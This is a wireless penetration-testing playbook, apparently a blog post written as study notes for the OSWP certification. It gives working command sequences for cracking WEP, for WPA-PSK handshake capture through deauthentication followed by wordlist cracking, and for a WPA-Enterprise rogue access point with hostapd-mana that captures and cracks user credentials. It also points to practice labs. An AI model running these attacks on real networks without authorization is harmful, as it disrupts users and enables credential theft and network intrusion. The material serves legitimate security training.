---
title: "OSWP PlayBook: (Offensive Security Wireless Professional)"
classes: wide
header:
  teaser: /assets/images/oswp.png
ribbon: purple
description: "OSWP & Wireless Pentest Playbook"
categories:
  - Notes
tags:
  - notes
toc: true
---

# Summary

Kudos to my friend [@Abdulrahman](https://www.linkedin.com/in/abdulrahman-i-mahmoud) for starting the first version of the playbook and after contributing together we update it with organized structure, More steps and practicality. You can download the `PDF` version of the book fro [here](https://github.com/abdoibrahim1337/OSWP-PlayBook).

# Contact & Follow Us


|     |     |     |
| ---------- | ------- | ------- |
| Github   | [Abdulrahman](https://github.com/abdoibrahim1337) | [Zeyad](https://github.com/Zeyad-Azima) |
| Linkedin | [Abdulrahman](https://www.linkedin.com/in/abdulrahman-i-mahmoud/) | [Zeyad](https://www.linkedin.com/in/zer0verflow/) |
| Twitter/X | [Abdulrahman](https://x.com/Abdulrahma77977) | [Zeyad](https://x.com/AzimaZeyad) |
| Website |     | [Zeyad](https://zeyadazima.com) |
| Email | [0xexploiteagle@gmail.com](mailto:0xexploiteagle@gmail.com) | [contact@zeyadazima.com](mailto:contact@zeyadazima.com) |


## Follow The PlayBook Updates
- [https://github.com/abdoibrahim1337/OSWP-PlayBook](https://github.com/abdoibrahim1337/OSWP-PlayBook)
- [https://zeyadazima.com/notes/oswplaybook/](https://zeyadazima.com/notes/oswplaybook/)
  
# Reconnaissance

## Setup Interfaces

- Set Interface to monitor mode

```sh
sudo airmon-ng check kill && sudo airmon-ng start <interface>
```

- Set Interface to managed mode

```sh
sudo airmon-ng stop <interface>
```

## Monitor Networks

- Monitor Networks

```sh
sudo airodump-ng --band abg --manufacturer <interface_in_mointor_mode>
```

- Monitor Networks including `WPS`

```sh
sudo airodump-ng --band abg --manufacturer --wps <interface_in_mointor_mode>
```

- Monitor Specific `Network`/`BSSID`

```sh
sudo airodump-ng --band abg --manufacturer --bssid <BSSID> -c <channel> <interface_in_mointor_mode>
```

## Discover Hidden Networks

- Get hidden Network `ESSID` using `BSSID`

```sh
sudo airodump-ng --band abg --bssid <mac> wlan0mon
```

- Get hidden Network w/ Bruteforcing
```sh
mdk4 wlan0mon p -t <BSSID> -f <wordlist>
```

## Change Channel

- The interface has to be in monitor mode:

```sh
sudo iwconfig <interface_in_mointor_mode> channel <number>
```

## Change MAC Address

1.  Stop network manager  
    `systemctl stop network-manager`
2.  Stop Interface  
    `ip link set wlan0 down`
3.  Change the MAC address  
    `macchanger -m <new_mac_address> <interface>`
4.  Start Interface  
    `ip link set wlan0 up`

### Tips

If not succeed in this case may

1.  interface name is wrong
2.  your interface in monitor mode  
    In second case to fix it set it to managed mode:  
    `sudo airmon-ng stop <int>`

# Connecting to Networks

## Connect to Open Network

**open.conf**

```conf
network={
    ssid="Open_Network_Name"
    key_mgmt=NONE
}
```

Set `ssid` to the network name you want to connect to. Then, Save it to `open.conf` and connect using the following command:

```sh
sudo wpa_supplicant -i <int> -c <file>
```

Then open another terminal and request `ip` from the `DHCP` server:

```sh
sudo dhclient wlan0 -v
```

## Connect to WPA(1/2/3) Networks

**WPA**

```conf
network={
    ssid="SSID"
    psk="password"
    scan_ssid=1
    key_mgmt=WPA-PSK
    proto=WPA2
}
```

for the `proto` set it to the `WPA(version)`:

- `WPA`
- `WPA2`
- `WPA3`

Set `ssid` to the network name you want to connect to. Then, Save it to `wpa.conf` and connect using the following command:

```sh
sudo wpa_supplicant -i <int> -c <file>
```

Then open another terminal and request `ip` from the `DHCP` server:

```sh
sudo dhclient wlan0 -v
```

## Connect to WPA Enterprise

```conf
network={
  ssid="SSID"
  scan_ssid=1
  key_mgmt=WPA-EAP
  eap=PEAP
  identity="identity\user"
  password="password"
  phase1="peaplabel=0"
  phase2="auth=MSCHAPV2"
}
```

set `identity` to the username, and `password` to the password.  
Set `ssid` to the network name you want to connect to. Then, Save it to `wpa_entp.conf` and connect using the following command:

```sh
sudo wpa_supplicant -i <int> -c <file>
```

Then open another terminal and request `ip` from the `DHCP` server:

```sh
sudo dhclient wlan0 -v
```

## Connect to WEP Network

```conf
network={
  ssid="SSID"
  key_mgmt=NONE
  wep_key0=""
  wep_tx_keyidx=0
}
```

> Note : Password(wep\_key0) in WEP should be lowercase if hex and without `""`  
> Capital also works in hex password

Set `ssid` to the network name you want to connect to. Then, Save it to `wep.conf` and connect using the following command:

```sh
sudo wpa_supplicant -i <int> -c <file>
```

Then open another terminal and request `ip` from the `DHCP` server:

```sh
sudo dhclient wlan0 -v
```

# Attacking Networks

## Attacking WEP Networks

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/25a28bbe-eedf-45ff-b37e-9757206488e7)


1.  Capture packets with the `WEP` network info

```sh
sudo airodump-ng -w <pcap_file_name> --band abg --bssid <mac> -c <channel> wlan0mon
```

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/26e2fcb3-25fd-4dd0-8605-d6cee8b47f84)


2.  Send fake authentication

```sh
sudo aireplay-ng -1 0 -a <BSSID> -h <Interface_Mac> -e "ESSID" <Interface>
```

> Note: The interface mac address you can use anything also you if you would like to spoof one

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/2ecccfa9-7b11-4475-9c42-e96ca787e07b)


3.  ARPreplay Attack

```sh
sudo aireplay-ng --arpreplay -b <BSSID> -h <Interface_mac_address> <interface_in_mointor_mode>
```

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/83bdb6cb-7a7f-4ab9-84fc-b1a18b1daa47)


4.  Crack password

```sh
sudo aircrack-ng wep-01.cap
```

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/579ac7b3-1ba3-48fe-910c-2b5a6a3dc6de)


## Attacking WPA-PSK Networks

1.  Gathering information of the target network like the `Channel` , `BSSID`

```sh
sudo airodump-ng --band abg <interface_in_mointor_mode>
```

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/c71aad24-31da-40ad-a8a7-e50e0403ee54)


> The above network type is WPA1 as there is no version appered

2.  Capture Handshake

```sh
sudo airodump-ng <interface_in_monitor_mode> --bssid <BSSID> -c <channel> -w <pcap_file_name>
```

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/dcdf06a5-69f8-4431-b004-3c4d5b2071a0)


3.  Perform De-authentication attack (kick a spasific client from the network to get the handshake)

```sh
sudo aireplay-ng -0 5 -c <client-mac> -a <BSSID>  <interface_in_mointor_mode>
```

> Note: Delete `-c` option if you want to do it in broadcast (Kick all clients)

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/da52dea5-5c98-4697-afbb-ab6360367652)


4.  Wait till get the handshake

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/331c6a18-6d06-4760-9b9c-f83bcb4ecbf3)


5.  After getting `EAPOL` ( Handshake), We will crack the password using aircrack-ng

```sh
sudo aircrack-ng -w <wordlist> capfile.cap
```

> Connect to the network using connecting to networks section

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/e4a8a697-8c0a-4609-aca3-3b5ecf538203)


## Attacking WPA-Enterprise

1.  First, We gather information about the network like `BSSID` , `channel` to filter the networks using:

```sh
sudo airodump-ng --band abg <interface_in_mointor_mode>
```

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/44b7b04c-31c2-4e6b-ba69-265572e45f22)


2.  Then we gather handshake for the enterprise network

```sh
sudo airodump-ng --band abg -c x --bssid <BSSID> -w <pcap_file_name> <interface_in_mointor_mode>
```

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/a55a09f5-9dd3-40d7-8320-7f291ec7042c)


3.  After that we look at clients of the network and try to De-authenticate a client to get `PMKID` for the network:

```sh
sudo aireplay-ng -0 4 -a <BSSID> -c <client_mac> <interface_in_mointor_mode>
```

> Then we wait till we get handshake, In some cases we can wait client to connect.

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/c16fbe89-75aa-4a41-b06a-bba233b05b64)


4.  After we get it we go through cap file and extract the `IDENTITY USER`

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/d56ebb59-8fec-4a3e-908d-de65e88ea0c4)


5.  Extract the `Certificate`

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/943fb932-8769-4761-b423-e99a2281d1c6)


> Note: Save the cert in `der` as the following

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/21a51519-9bbe-4f5d-b67c-b08daa5a9ada)

6.  We also display information of certificate using this command

```sh
openssl x509 -inform der -in CERTIFICATE_FILENAME -text
```

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/4572ce69-6645-4287-8e9f-279da57f0f3e)


7.  Fake the network using `freeradius`  
    We go to `/etc/freeradius/3.0/certs` path, Then we change the following 2 files with information we obtained from the certificate:

```sh
nano ca.cnf
```

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/fbf487d4-e74f-4052-8b99-6812bf1c1387)


```sh
nano server.cnf
```

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/a5b787fc-f280-4c37-b284-ee58c27af701)


9.  After that we do the following commands under `/etc/freeradius/3.0/certs` to generate `Diffie Hellman key` for `hostapd-mana`

```sh
rm dh
make 
```

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/6d7916b3-8f96-4b96-b5dc-ae45125e8b6f)


> You may encounter error as the following, You can ignore it

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/8f579cab-2ee9-4c26-9ff0-c3e26ca44314)


10 . We create `EAP` user filename `mana.eap_user`

```sh
*	PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/1e9652c6-a0f1-4aa2-a403-ca65316a4117)


11. After that we create a fake access point by creating a file called `network.conf` under any other directory
12. We paste the following configurations in the file and modify it to our needs:

```sh
ssid=<ESSID>
interface=<managed_mode_interface>
driver=nl80211

channel=<channel>
hw_mode=a
ieee8021x=1
eap_server=1
eapol_key_index_workaround=0

eap_user_file=/etc/hostapd-mana/mana.eap_user

ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key

private_key_passwd=whatever

dh_file=/etc/freeradius/3.0/certs/dh


auth_algs=1
wpa=3
wpa_key_mgmt=WPA-EAP


wpa_pairwise=CCMP TKIP
mana_wpe=1
mana_credout=/tmp/hostapd.credoutfile
mana_eapsuccess=1
mana_eaptls=1
```

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/6b189ea5-7a53-469a-8d07-a45eac454908)


13. Turn the interface to managed mode again
    
14. Then use the following command to create fake `AP`
    

```sh
sudo hostapd-mana <file.conf>
```

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/0c73bcf5-6cf0-40f5-82a2-0a7201a59b7e)


15. Perform De-authentication attack (kick a spasific client from the network to get the handshake), Using another interface:

```sh
sudo aireplay-ng -0 0 -c <client-mac> -a <BSSID>  <interface_in_mointor_mode>
```

> Note: Delete `-c` option if you want to do it in broadcast (Kick all clients)  
> You need to use another interface in monitor mode, Also you need to set the interface to the same channel as the target network before performing the De-authenticate attack, As the following:

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/c4cafb8c-db5c-40db-bcc6-b3da158e7434)

> Tip: If there are 2 Enterprise network with the same name, You need to perform the De-authenticate attack on both of the networks.

16. then once you get handshake you will copy and paste command of asleep and adding -W /path/to/wordlist

```sh
asleap -C do:3b:8d:7b:22:00:0:91 -R 68:09:13:ac:e8:df:36:5f:42:94:fb:97:91:05:2:21:72:ff:b3:ce:c0:ca:26:f7 -W /usr/share/john/password.lst
```

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/33194df7-fec9-4f2d-b658-04beb188ee0b)


> Note: if it doesn't work with you can get the hash of the `Hashcat` tool and put it in file called `hashfile` and use this command to crack it  
> `hashcat -a 0 -m 5500 hashfile rockyou.txt --force`

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/18e2b203-ca58-4233-939d-eb26a6da24af)


17. After getting username and password here you go for connecting to the network section.

# Install Required Tools & Packages:

## FreeRADIUS

```bash
sudo apt update
sudo apt install freeradius freeradius-utils
```

## Hostapd-Mana

```bash
sudo apt update
sudo apt install libssl-dev libnl-3-dev libnl-genl-3-dev
git clone https://github.com/sensepost/hostapd-mana.git
cd hostapd-mana/hostapd
make
sudo make install
```

## Aircrack-ng

```bash
sudo apt update
sudo apt install aircrack-ng
```

## Asleap

```bash
sudo apt update
sudo apt install asleap
```

## Hashcat

```bash
sudo apt update
sudo apt install hashcat
```

## John the Ripper

```bash
sudo apt update
sudo apt install john
```

# Resources & Labs

## Resources

- https://github.com/dh0ck/Wi-Fi-Pentesting-Cheatsheet
- [https://github.com/drewlong/oswp\_notes](https://github.com/drewlong/oswp_notes)
- https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/

## Labs and Linux Dist
### Labs 5.2.1
- https://wifichallengelab.com
- https://github.com/r4ulcl/WiFiChallengeLab-docker

> Note: For this lab you won't need any physical cards or anything all performed through, The labs virtual machine include everything, shoutout for [r4ulcl](https://github.com/r4ulcl) for this amazing lab.
### Linux Dist
- https://www.wifislax.com: Wireless Pentest OS

